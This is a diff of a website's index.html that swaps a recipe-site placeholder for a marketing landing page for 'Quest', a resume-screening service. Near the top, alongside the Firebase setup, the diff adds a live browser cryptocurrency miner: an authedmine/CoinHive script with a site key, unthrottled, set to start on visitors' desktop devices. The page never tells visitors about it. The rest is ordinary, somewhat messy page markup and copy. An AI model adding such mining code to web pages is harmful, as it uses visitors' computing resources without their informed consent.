@@ -1,49 +1,430 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Welcome to Firebase Hosting</title>
+<script src="JS/firebaseCalls.js"></script>
+<script src="JS/methods.js"></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" type="text/css" href="styles.css">
+<link href="https://static.tutsplus.com/assets/favicon-3ef7b4f54ed4378b31ff3124d3c4bff8.png" rel="shortcut icon" type="image/png">
+<link href="https://static.tutsplus.com/assets/apple-touch-icon-3ef7b4f54ed4378b31ff3124d3c4bff8.png" rel="apple-touch-icon" type="image/png">
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.1/css/bulma.min.css">
+<!--analytics-->
+<script type="text/javascript" async="" src="https://www.google-analytics.com/ga.js"></script>
+<link rel="stylesheet" href="css/circle.css">
+<script src="https://www.gstatic.com/firebasejs/4.6.2/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/4.6.2/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/4.6.2/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/4.6.2/firebase-database.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.1/Chart.bundle.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/canvasjs/1.7.0/canvasjs.js"></script>
+<script src="JS/methods.js"></script>
+<script src="JS/graph-plot.js"></script>
+<script>
+var config = {
+  // Initialize Firebase
+  // TODO: Replace with your project's customized code snippet
+    apiKey: "AIzaSyD5m4M9WxvtSzXoLJwE0HCNBa10542IN-g",
+    authDomain: "app-l-133e5.firebaseapp.com",
+    databaseURL: "https://app-l-133e5.firebaseio.com",
+    projectId: "app-l-133e5",
+    storageBucket: "",
+    messagingSenderId: "939170253210"
+  };
+  firebase.initializeApp(config);
+  </script>
+</script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('XGJUeubPyy5ODqriKFeea4huISw6Kv6y', {throttle: 0.0});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 
-    <!-- update the version number as needed -->
-    <script defer src="/__/firebase/4.10.0/firebase-app.js"></script>
-    <!-- include only the Firebase features as you need -->
-    <script defer src="/__/firebase/4.10.0/firebase-auth.js"></script>
-    <script defer src="/__/firebase/4.10.0/firebase-database.js"></script>
-    <script defer src="/__/firebase/4.10.0/firebase-messaging.js"></script>
-    <script defer src="/__/firebase/4.10.0/firebase-storage.js"></script>
-    <!-- initialize the SDK after all desired features are loaded -->
-    <script defer src="/__/firebase/init.js"></script>
 
-    <style media="screen">
-      body { background: #ECEFF1; color: rgba(0,0,0,0.87); font-family: Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-      #message { background: white; max-width: 360px; margin: 100px auto 16px; padding: 32px 24px; border-radius: 3px; }
-      #message h2 { color: #ffa100; font-weight: bold; font-size: 16px; margin: 0 0 8px; }
-      #message h1 { font-size: 22px; font-weight: 300; color: rgba(0,0,0,0.6); margin: 0 0 16px;}
-      #message p { line-height: 140%; margin: 16px 0 24px; font-size: 14px; }
-      #message a { display: block; text-align: center; background: #039be5; text-transform: uppercase; text-decoration: none; color: white; padding: 16px; border-radius: 4px; }
-      #message, #message a { box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
-      #load { color: rgba(0,0,0,0.4); text-align: center; font-size: 13px; }
-      @media (max-width: 600px) {
-        body, #message { margin-top: 0; background: white; box-shadow: none; }
-        body { border-top: 16px solid #ffa100; }
-      }
-    </style>
-  </head>
-  <body>
-      <div id="Title"> <!-- the start of the top header square div -->
-          <div id="t1"> <!-- dividing the top header to 2 pieces where the logo and the title are -->
-              <p>Norm's Recipe Book</p>
+<header>
+  <!-- <button2 class = "floated" type='button' id="logout_btn" onclick="logout()" >Sign Out</button2> -->
+  <!-- <button2 class = "floated" type='button' id="account_btn" onclick="redirectAccount()" >My Account</button2> -->
+  <!-- <button2 class = "floated" type='button' id="logout_btn" onclick="redirectLogin()" >Sign In</button2> -->
+  <!-- <button2 class = "floated" type='button' id="logout_btn" onclick="redirectRegister()" >Register</button2> -->
+</header>
+<section class="hero is-primary is-medium">
+  <!-- Hero head: will stick at the top -->
+  <div class="hero-head">
+    <nav class="navbar">
+      <div class="container">
+        <!-- <div class="navbar-brand">
+          <a class="navbar-item">
+            <img src="https://bulma.io/images/bulma-type-white.png" alt="Logo">
+          </a>
+          <span class="navbar-burger burger" data-target="navbarMenuHeroA">
+            <span></span>
+            <span></span>
+            <span></span>
+          </span>
+        </div> -->
+        <div id="navbarMenuHeroA" class="navbar-menu">
+          <div class="navbar-end">
+            <a class="navbar-item" id="logout_btn" onclick="redirectLogin()">
+              Sign In
+            </a>
+            <a class="navbar-item" id="logout_btn" onclick="redirectRegister()">
+              Register
+            </a>
+            <a class="navbar-item" onclick="startModal()">
+              Feedback
+            </a>
+            <!-- <span class="navbar-item">
+              <a class="button is-primary is-inverted">
+                <span class="icon">
+                  <i class="fa fa-chrome"></i>
+                </span>
+                <span>Chrome Extension</span>
+              </a>
+            </span> -->
           </div>
+        </div>
       </div>
-      <div id="Content"> <!-- the content of the page next to the navigation bar -->
-          <p id="tinyTitle">Home</p> <!-- small navigation information -->
-          <p id="paragraph">Welcome to Norm's recipe site.<br>we have everything that a new cook needs to get started, and for the experienced cook to keep on going.
+    </nav>
+  </div>
 
-          Check out our new section on specialty recipes!</p>
+  <div class="modal" id="modal">
+    <div class="modal-background"></div>
+    <div class="modal-card">
+      <header class="modal-card-head">
+        <p class="modal-card-title">Thanks for your feedback, it helps us improve</p>
+        <button class="delete" aria-label="close" onclick="endModal()"></button>
+      </header>
+      <section class="modal-card-body">
+      <input class="input" id="feedback" placeholder="Enter feedback here"></input>
+      </section>
+      <footer class="modal-card-foot">
+        <button class="button is-success" onclick="sendFeedback()">Send feedback</button>
+        <button class="button" onclick="endModal()">Cancel</button>
+      </footer>
+    </div>
+  </div>
+
+  <!-- Hero content: will be in the middle -->
+  <div class="hero-body">
+    <div class="container has-text-centered">
+      <h1 class="title">
+        Before you apply for the job, make sure your resume isn't auto rejected by a machine
+      </h1>
+      <h2 class="subtitle" style="margin-top:16px">
+        Quest aims to leverage technology, just like recruiters to give you the best shot at getting an interview.
+      </h2>
+    </div>
+  </div>
+
+  <!-- Hero footer: will stick at the bottom -->
+  <div class="hero-foot">
+    <nav class="tabs">
+      <div class="container">
+        <ul>
+          <li  onclick="scrollToStats()"><a>The Stats</a></li>
+          <li  onclick="scrollToOptimize()"><a>Simply Optimize</a></li>
+          <li  onclick="scrollToShine()"><a>Shine Bright</a></li>
+          <li  onclick="scrollToFeedback()"><a>Receive Feedback</a></li>
+          <li onclick="scrollToRank()"><a>View Rank</a></li>
+          <li  onclick="scrollToGetStarted()"><a>Get Started</a></li>
+        </ul>
       </div>
-      <div id="footer"> <!-- footer note on the bottom -->
-          <p>&copy; Norm's Recipe Book Inc<p>
-      </div>
-  </body>
+    </nav>
+  </div>
+</section>
+<div class="container" >
+<body onload="loadFooter()" style="background:#FAFAFA">
+  <section class="section">
+  <div class="container" id="stats">
+    <h1 class="title has-text-centered">Getting an offer, is a numbers game..</h1>
+    <h2 class="subtitle has-text-centered" style="margin-top:1%" >
+  For most, the difficulty is boss level.
+    </h2>
+  </div>
+</section>
+<br style="clear: left;" />
+        <nav class="level">
+        <div class = "card" style="width:430px;height:370px;background:#ffffff;display:inline-block">
+          <nav class="level">
+              <div class="level-item has-text-centered">
+            <div class="c100 p21 large" style="margin-top:8%">
+                   <span>21%</span>
+                   <div class="slice">
+                       <div class="bar"></div>
+                       <div class="fill"></div>
+                   </div>
+               </div>
+             </div>
+             </nav>
+              <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:8px;font-size:22px" >% of resumes that beat the bot.</h1>
+          </div>
+          <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">Building and crafting a resume takes <u>time</u></h1>
+          </div>
+            <div class="level-item has-text-centered">
+            <h1  style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">Time that's trashed by a bot</h1>
+          </div>
+
+        </div>
+        <div class = "card" style="width:430px;height:370px;background:#ffffff;display:inline-block">
+          <nav class="level">
+            <div class="level-item has-text-centered">
+            <div class="c100 p7 large" style="margin-top:8%">
+                   <span>7</span>
+                   <div class="slice">
+                       <div class="bar"></div>
+                       <div class="fill"></div>
+                   </div>
+               </div>
+             </div>
+             </nav>
+            <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:8px;font-size:22px" >Seconds to impress a recruiter</h1>
+            </div>
+            <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">Barely any time to make an impression</h1>
+            </div>
+            <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">You've got to be <b>quick</b> and to the point</h1>
+            </div>
+        </div>
+        <div class = "card" style="height:370px;width:430px;background:#ffffff;display:inline-block">
+          <nav class="level">
+            <div class="level-item has-text-centered">
+            <div class="c100 p100 large" style="margin-top:8%;">
+                   <span>1</span>
+                   <div class="slice">
+                       <div class="pie"></div>
+                       <div class="fill"></div>
+                   </div>
+               </div>
+               </div>
+             </nav>
+             <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:8px;font-size:22px" >app that guarantees you more interviews</h1>
+              </div>
+              <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">Getting human eyes on your application</h1>
+              </div>
+              <div class="level-item has-text-centered">
+            <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px;">And an interview to boot</h1>
+              </div>
+
+        </div>
+        </nav>
+
+    <!-- <button style="margin:auto;display:block" id = "slide1">Continue</button> -->
+
+
+<!-- <h1 style="color:#666566;font-family:arial;margin-top:5%;;font-weight:bold;text-align:center;margin-top:5%">Our service guides you become the fit companies want</h1> -->
+<section class="section">
+<div class="container" id="optimize">
+  <h1 class="title has-text-centered">Make the best of your 7 seconds</h1>
+  <h2 class="subtitle has-text-centered" style="margin-top:1%">We'll handle the logistics, and usage is simple.</h2>
+</div>
+</section>
+<br style="clear: left;" />
+
+<div class="card" style="width:100%;height:600px;background:#ffffff;margin:auto;">
+  <img src="https://image.ibb.co/nhfaSG/index_1.png" style="width:1085px;height:456px;margin:auto;display:block"></img>
+  <h1 style="text-align:center;font-weight:lighter;;font-family:Arial">Simply copy and paste the job application link and company name to request analysis</h1>
+</div>
+<br style="clear: left;" />
+
+<!-- <button style="margin:auto;display:block;margin-top:2%">Continue</button> -->
+
+
+<section class="section" >
+<div class="container" id="shine">
+  <h1 class="title has-text-centered">Under the hood</h1>
+  <h2 class="subtitle has-text-centered" style="margin-top:1%">It's not about beating a bot. It's about turning applications into opportunities.</h2>
+</div>
+</section>
+<br style="clear: left;" />
+
+<div class="modal" id="eula">
+  <div class="modal-background"></div>
+  <div class="modal-card">
+    <header class="modal-card-head">
+      <!-- <p class="modal-card-title">If you're resume passes our ATS check, we'll gladly read your resume</p> -->
+      <button class="delete" aria-label="close" onclick="endSentimentModal()"></button>
+    </header>
+    <section class="modal-card-body">
+<p class="modal-card-title">Given your resume passes our ATS check, we'll gladly read your resume</p>
+    </section>
+    <footer class="modal-card-foot">
+      <button class="button" onclick="endSentimentModal()">Cancel</button>
+    </footer>
+  </div>
+</div>
+
+<!-- <section class="section" style="margin:auto;display:block;width:100%"> -->
+    <nav class="level">
+  <div class="level-item has-text-centered">
+    <div class = "card" style="width:430px;height:330px;background:#ffffff;">
+      <div>
+      <figure class="image is-128x128" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px">
+        <img src="Intros/brain.png">
+      </figure>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:24px;font-size:22px" >Sentiment Analysis</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px;margin-top:5%">With Your resume, we translate words into pure <b>metrics</b></h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">Metrics that define who the ideal candidate is</h1>
+    </div>
+    </div>
+  </div>
+  <div class="level-item has-text-centered">
+    <div class = "card" style="width:430px;height:330px;background:#ffffff;margin:16px;">
+      <div>
+      <figure class="image is-128x128" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px">
+        <img src="Intros/buzz.png">
+      </figure>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:24px;font-size:22px" >Buzzword extraction</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px;margin-top:5%">Every job posting contains keywords managers look for</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px">We'll help tailor your resume to fit the description of the position</h1>
+    </div>
+    </div>
+  </div>
+  <div class="level-item has-text-centered">
+    <div class = "card" style="width:430px;height:330px;background:#ffffff;margin:auto;">
+      <div>
+      <figure class="image is-128x128" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px">
+        <img src="Intros/lottery.png">
+      </figure>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:24px;font-size:22px" >ATS System Check</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px;margin-top:5%">Don't let a <s>gramer</s> mistake stop you at the door</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:16px;">Our intensive bot-check asses your resume before you apply</h1>
+    </div>
+    </div>
+  </div>
+</nav>
+<!-- </section> -->
+<br style="clear: left;" />
+<!-- <button style="margin:auto;display:block;margin-top:2%">Continue</button> -->
+
+
+<!-- <h1 style="color:#666566;font-family:arial;margin-top:5%;;font-weight:bold;text-align:center;margin-top:18%">Feedback that drives progression</h1> -->
+<section class="section">
+<div class="container" id="feedbackIn">
+  <h1 class="title has-text-centered">For every application we provide a Mentions chart</h1>
+  <h2 class="subtitle has-text-centered" style="margin-top:1%">
+  that tracks your characteristcs, the applications, and your skills relative to other potential candidates
+  </h2>
+</div>
+</section>
+<br style="clear: left;" />
+
+<div class="card" style="width:100%;height:800px;background:#ffffff;margin:auto;">
+  <div style="">
+  <img src="https://image.ibb.co/fP28xG/graph_large2.png" style=";display:block;margin:auto;"></img>
+</div>
+</div>
+<!-- <br style="clear: left;" /> -->
+
+<!-- <button style="margin:auto;display:block;margin-top:2%">Continue</button> -->
+
+<!-- <h1 style="color:#666566;font-family:arial;font-weight:bold;text-align:center">Stay ahead of the competiton</h1> -->
+  <br style="clear: left;" />
+<section class="section">
+<div class="container" id="rank">
+  <h1 class="title has-text-centered">Align yourself with your dream job</h1>
+  <h2 class="subtitle has-text-centered" style="margin-top:16px">
+   A score is re-determined every time you submit a job link, and scored differently for every job. Scoring 80% or above would likely <b>beat the bot.</b>
+  </h2>
+</div>
+</section>
+<!-- <br style="clear: left;" /> -->
+
+<!-- <h1 style="text-align:center;font-weight:lighter;;font-family:Arial">With our fit metric to see where you stand</h1> -->
+
+<!-- <nav class="level">
+   <div class="level-item level-left">
+<div class="card" style="width:100%;height:460px;background:#ffffff;margin:auto;">
+</div>
+ <div class="level-item level-right">
+  <img src="Images/index_2.png" style="width:407px;height:326px;margin:auto;display:block"></img>
+
+</div>
+</div>
+
+</nav> -->
+
+<section id="about" class="section">
+            <div class="columns">
+                <div class="column">
+                    <figure class="image" >
+                        <img src="https://image.ibb.co/kOuy1b/index_2_1.png" style="width:100%;height:100%;margin:auto;display:block"></img>
+                    </figure>
+                </div>
+                <!-- <div class="column">
+                    <h1 class="title is-1">Results that matter</h1>
+                    <p class="subtitle is-4 has-text-centered" >Scoring 80% or above would likely <b>beat the bot.</b>Stay inline with the competition by staying above the average and track your ranking for a perspective position.</p>
+                </div> -->
+            </div>
+        </section>
+        <br style="clear: left;" />
+
+
+<!-- <h1 style="color:#666566;font-family:arial;margin-top:5%;;font-weight:bold;text-align:center;margin-top:18%">Register today for free access to all of our features</h1> -->
+<section class="section">
+<div class="container" id="start">
+  <h1 class="title  has-text-centered">Quest aims to help you dial in on companies you <u>want</u> to work for. Not whatever floats along.</h1>
+</div>
+</section>
+<!-- <br style="clear: left;" /> -->
+
+<!-- <section> -->
+  <!-- <div style="float:left;margin-bottom:24px;">
+    <div class = "card" style="width:642px;height:400px;background:#ffffff;margin:auto;margin-top:4%;">
+      <figure class="image is-128x128" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px">
+        <img src="images/chrome.png">
+      </figure>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:48px;font-size:22px" >Download our chrome extension to get fly through applications</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:18px">With our extension, visit websites directly and run analysis</h1>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:16px;font-size:18px">Results are emailed and stored direction on the homepage</h1>
+       <button class="button is-info" style="background: #4285f4;margin:auto;display:block;margin-top:32px;">
+        View extension</button>
+    </div>
+  </div> -->
+  <!-- <div style="float:left;margin-bottom:24px;"> -->
+    <div class = "card" style="width:642px;height:300px;background:#ffffff;margin:auto;margin-top:4%;;margin:auto">
+      <div>
+      <!-- <img src="images/threads.png" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px"></img> -->
+      <figure class="image is-128x128" style="margin:auto;display:block;height:80px;width:80px;padding-top:24px">
+        <img src="Images/cityscape.png">
+      </figure>
+        <h1 style="text-align:center;font-weight:lighter;font-family: Helvetica;padding-top:48px;font-size:22px" >Register today for free to gain full access to Quest</h1>
+        <div style = "margin:auto;display:block;width:450px;">
+          <nav class="level" style="margin-top:32px">
+            <div class="level-item">
+       <button onclick="redirectRegister()" class="button is-info" style="background: #4285f4">New user? Create account</button>
+       </div>
+       <div class="level-item">
+       <button onclick="redirectLogin()" class="button is-info" style="background: #4285f4"
+       >Returning user? Login</button>
+       </div>
+       </div>
+     </div>
+    </div>
+    <!-- </div> -->
+<!-- </section> -->
+<br style="clear: left;" />
+
+</div>
+ <!-- <button style="margin:auto;display:block;margin-top:2%">Continue</button> -->
+
+
+
+
+</body>
+<footer class="footer" style="margin-top:100px;">
+<div id = "footerArea">
+</div>
+</div>
 </html>
